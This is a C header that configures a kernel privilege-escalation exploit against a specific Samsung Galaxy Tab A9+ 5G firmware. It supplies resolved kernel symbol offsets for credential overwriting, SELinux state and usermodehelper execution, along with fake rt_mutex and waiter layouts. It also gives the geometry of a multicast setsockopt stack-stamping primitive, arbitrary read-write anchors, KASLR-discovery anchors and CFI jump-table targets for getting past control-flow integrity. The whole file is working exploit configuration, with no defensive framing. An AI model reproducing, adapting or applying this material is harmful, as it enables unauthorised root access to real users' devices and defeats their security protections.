#ifndef TARGET_H
#define TARGET_H

/* =========================================================================
 * Target Device: Samsung Galaxy Tab A9+ 5G (SM-X216B / gta9p)
 * Firmware:      X216BXXS9DYJ7
 * Kernel:        5.4.249-qgki-31053672-abX216BXXS9DYJ7 (Qualcomm SM6375)
 * Arch / Mode:   AArch64 Little-Endian (CONFIG_CFI_CLANG=y)
 * ========================================================================= */

#define TARGET_DEVICE             "SM-X216B"
#define TARGET_BUILD              "X216BXXS9DYJ7"
#define TARGET_KERNEL             "5.4.249-qgki-31053672"
#define BUILD_VARIANT_LABEL       "gta9p-X216BXXS9DYJ7-root-umh"

/* Kernel Virtual Address Base & Direct Map */
#ifndef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE          0xffffffc010080000ULL
#endif
#define KIMAGE_BASE               KIMAGE_TEXT_BASE
#define P0_PAGE_OFFSET            0xffffff8000000000ULL
#define P0_PHYS_OFFSET            0x80000000ULL
#define P0_KERNEL_PHYS_LOAD       0x80080000ULL

#ifndef DIRECT_MAP_BASE
#define DIRECT_MAP_BASE           0xffffff8000000000ULL
#endif
#ifndef DIRECT_MAP_END
#define DIRECT_MAP_END            0xffffffc000000000ULL
#endif

/* -------------------------------------------------------------------------
 * Resolved Kernel Symbol Offsets (addr - KIMAGE_TEXT_BASE)
 * ------------------------------------------------------------------------- */
#define INIT_TASK_OFF             0x02960280ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x028ef9c8ULL
#define ROOT_TASK_GROUP_OFF       0x02b30f40ULL
#define KMALLOC_CACHES_OFF        0x0235acf0ULL
#define ANON_PIPE_BUF_OPS_OFF     0x021755b8ULL
#define SELINUX_STATE_OFF         0x02b1f000ULL
#define SELINUX_ENFORCING_OFF     0x02b1f001ULL

#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0x00297274ULL
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF  0x01601870ULL
#define COMMIT_CREDS_OFF          0x002a7184ULL
#define PREPARE_KERNEL_CRED_OFF   0x002a75b4ULL
#define NOOP_LLSEEK_OFF           0x0049cbd0ULL

#define ADDR_INIT_TASK            (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ADDR_SYSTEM_UNBOUND_WQ    (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ADDR_CALL_USERMODEHELPER_EXEC_WORK        (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define ADDR_CALL_USERMODEHELPER_EXEC_WORK_CFI_JT (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF)
#define ADDR_ANON_PIPE_BUF_OPS    (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ADDR_SELINUX_STATE        (KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)

/* Legacy / Scratch Addresses & Aliases */
#define ADDR_VERIFIED_VLOCK       0xffffffc012f04080ULL

/* Ghost write primitive addresses (5.4.249 specific)
 *
 * For the PI-walk to succeed and the write primitive to work:
 * - fake_lock: must be a writable region that looks like an empty rt_mutex (owner=0, waiters empty)
 * - ghost_task: must be a dead-end task (pi_blocked_on=0) to terminate the PI-walk
 *
 * We use .bss section which starts at 0xffffffc012b9ea00 and is 16MB.
 * A deep offset ensures we're in zeroed memory.
 *
 * Using offsets that land well within the .bss section:
 * - fake_lock at 0x1200: 0xffffffc012b9fc00
 * - ghost_task at 0x2000: 0xffffffc012b9ea00 + 0x2000 = 0xffffffc012ba0a00
 *
 * Note: The original ghostlock-kit uses z_pagemap_global + 0x1200 for 5.15.
 * For 5.4.249 on SM-X216B, we use the .bss section instead.
 */
#define BSS_BASE_OFF              0x02b9ea00ULL
#define FAKE_LOCK_OFFSET          0x1200
#define GHOST_TASK_OFFSET         0x2000
#define ADDR_FAKE_LOCK            (KIMAGE_TEXT_BASE + BSS_BASE_OFF + FAKE_LOCK_OFFSET)
#define ADDR_GHOST_TASK           (KIMAGE_TEXT_BASE + BSS_BASE_OFF + GHOST_TASK_OFFSET)

/* Ashmem & Configfs Virtual ARW Offsets */
#define ASHMEM_FOPS_OFF           0x0214ee28ULL
#define ASHMEM_MISC_FOPS_OFF      0x0294baf0ULL
#define CONFIGFS_WRITE_BIN_FILE_OFF         0x00559784ULL
#define CONFIGFS_WRITE_BIN_FILE_CFI_JT_OFF  0x015f595cULL
#define CONFIGFS_READ_BIN_FILE_OFF          0x0055958cULL
#define CONFIGFS_READ_BIN_FILE_CFI_JT_OFF   0x015f38d8ULL

#define ADDR_ASHMEM_FOPS          (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_FILE_CFI_JT_OFF)
#define ADDR_CONFIGFS_READ_BIN_FILE_CFI_JT  (KIMAGE_TEXT_BASE + CONFIGFS_READ_BIN_FILE_CFI_JT_OFF)

/* TraceFS KASLR Discovery Anchors */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF     0x0029eb5cULL
#define SLIDE_SYSCTL_BOOTID_OFF   0x02c9d6e9ULL
#define SLIDE_NFULNL_LOGGER_OFF   0x028eac18ULL

/* -------------------------------------------------------------------------
 * Process & Credential Structure Offsets (Linux 5.4 ABI)
 * ------------------------------------------------------------------------- */
#define TASK_STRUCT_REAL_CRED_OFF 0x800ULL
#define TASK_STRUCT_CRED_OFF      0x808ULL
#define TASK_STRUCT_PI_LOCK_OFF   0x8dc
#define TASK_STRUCT_PI_WAITERS_OFF 0x8e8
#define TASK_STRUCT_PI_BLOCKED_ON_OFF 0x900

/* -------------------------------------------------------------------------
 * MCAST Stamping Primitive Configuration
 * -------------------------------------------------------------------------
 * On Linux 5.4 SM-X216B, native 64-bit IPv4 MCAST_BLOCK_SOURCE (optname 43)
 * copies a 264-byte struct group_source_req into do_ip_setsockopt's frame.
 *
 * MCAST_JOIN_GROUP (optname 42) uses struct group_req (136 bytes), which
 * terminates at SP_sys - 0x228, missing the waiter base at SP_sys - 0x1e8
 * by a 64-byte gap. Thus MCAST_JOIN_GROUP CANNOT reach the waiter.
 * ------------------------------------------------------------------------- */
#define MCAST_BLOCK_SOURCE        43
#define MCAST_JOIN_SOURCE_GROUP   46
#define MCAST_JOIN_GROUP          42    /* INSUFFICIENT DEPTH: 136B (gap: 64B) */

#define MCAST_STAMP_OPTNAME       MCAST_BLOCK_SOURCE
#define MCAST_STAMP_LEVEL         IPPROTO_IP
#define MCAST_STAMP_DOMAIN        AF_INET
#define MCAST_BUFFER_SIZE_64      264   /* sizeof(struct group_source_req) */

/* -------------------------------------------------------------------------
 * rt_mutex_waiter Geometry (Linux 5.4 AArch64: 80 bytes / 0x50)
 *
 * Notice: Linux 5.4 uses an 80-byte waiter, NOT 5.15's compact 88-byte layout.
 * wake_state (+0x40) and ww_ctx (+0x50) DO NOT EXIST in 5.4.
 * Active control words in rt_mutex_adjust_prio_chain strictly require
 * waiter_word <= 7.
 * ------------------------------------------------------------------------- */
#define RT_MUTEX_WAITER_SIZE      80
#define LEGACY_RT_MUTEX_WAITER    1
#define COMPACT_RT_MUTEX_WAITER   0

#define FAKE_WAITER_TREE_ENTRY_OFF      0x00  /* rb_node: 0x00, 0x08, 0x10 */
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18  /* rb_node: 0x18, 0x20, 0x28 */
#define FAKE_WAITER_TASK_OFF            0x30  /* Word 6: struct task_struct * */
#define FAKE_WAITER_LOCK_OFF            0x38  /* Word 7: struct rt_mutex * */
#define FAKE_WAITER_PRIO_OFF            0x40  /* Word 8: int prio */
#define FAKE_WAITER_DEADLINE_OFF        0x48  /* Word 9: u64 deadline */

/* -------------------------------------------------------------------------
 * 64-bit Direct MCAST Overlap Offsets (from smx216b_mcast_geometry_report.md)
 *
 * Futex Waiter base: SP_sys - 0x1e8
 * MCAST buffer:      SP_sys - 0x2b0 ... SP_sys - 0x1a8
 *
 * GDB-verified (2026-10-02): waiter at kernel stack offset 0x3cd8,
 * MCAST respray buffer starts at stack offset 0x3c00.
 * Waiter base inside buffer = 0x3cd8 - 0x3c00 = 0xd8 (216 bytes).
 *
 * From buffer start:
 *   - Waiter starts at buffer + 0xd8
 *   - waiter->task (Word 6) is at waiter + 0x30 = buffer + 0x108
 *   - waiter->lock (Word 7) is at waiter + 0x38 = buffer + 0x110
 *     (0x110 is 8B past the 264-byte buffer; lock is already correct
 *      from the SIGRETURN initial stamp — not written by MCAST respray)
 * -------------------------------------------------------------------------- */
#define MCAST_64_WAITER_BASE_OFF  0xd8  /* Waiter at 0xd8 from buffer start (GDB verified) */
#define MCAST_64_TASK_OFF         0x108 /* task at buffer + 0x108 (waiter + 0x30) */
#define MCAST_64_LOCK_OFF         0x110 /* lock at buffer + 0x110 (waiter + 0x38); outside 264B window */

/* Tree entry offsets (rb_node) from buffer start = MCAST_64_WAITER_BASE_OFF + field */
#define MCAST_64_TREE_PARENT_OFF  0xd8  /* tree_entry.__rb_parent_color (waiter + 0x00) */
#define MCAST_64_TREE_RIGHT_OFF   0xe0  /* tree_entry.rb_right           (waiter + 0x08) */
#define MCAST_64_TREE_LEFT_OFF    0xe8  /* tree_entry.rb_left            (waiter + 0x10) */

/* PI tree entry offsets from waiter base */
#define MCAST_64_PI_TREE_PARENT_OFF 0x18
#define MCAST_64_PI_TREE_RIGHT_OFF  0x20
#define MCAST_64_PI_TREE_LEFT_OFF   0x28

/* ARM32 Compat & Sigreturn Stamping Offsets */
#define EXP32_STAMP_OFF           0x68
#define SIGRETURN_WAITER_OFF      0x158

/* -------------------------------------------------------------------------
 * Configfs Buffer Internal Layout (Linux 5.4)
 * ------------------------------------------------------------------------- */
#define CFG_MUTEX_OFF             0x20
#define CFG_READ_IN_PROGRESS_OFF  0x44  /* byte */
#define CFG_WRITE_IN_PROGRESS_OFF 0x45  /* byte */
#define CFG_BIN_BUFFER_OFF        0x48  /* void *bin_buffer */
#define CFG_BIN_BUFFER_SIZE_OFF   0x50  /* int bin_buffer_size */
#define CFG_CB_MAX_SIZE_OFF       0x54  /* size_t cb_max_size */

/* Linux 5.4 file_operations offsets */
#define FOPS_READ_OFF             0x10
#define FOPS_WRITE_OFF            0x18

/* -------------------------------------------------------------------------
 * Clang Forward-Edge CFI Jump Table (.cfi_jt) Configuration
 *
 * Kernel built with CONFIG_CFI_CLANG=y (strict enforcement).
 * Any forged function pointer invoked via indirect call must target the
 * corresponding compiler-generated .cfi_jt thunk rather than the direct
 * function body.
 * ------------------------------------------------------------------------- */
#define CONFIG_CFI_CLANG_ENABLED  1
#define WORK_FUNC_UMH_EXEC        ADDR_CALL_USERMODEHELPER_EXEC_WORK_CFI_JT

#endif /* TARGET_H */
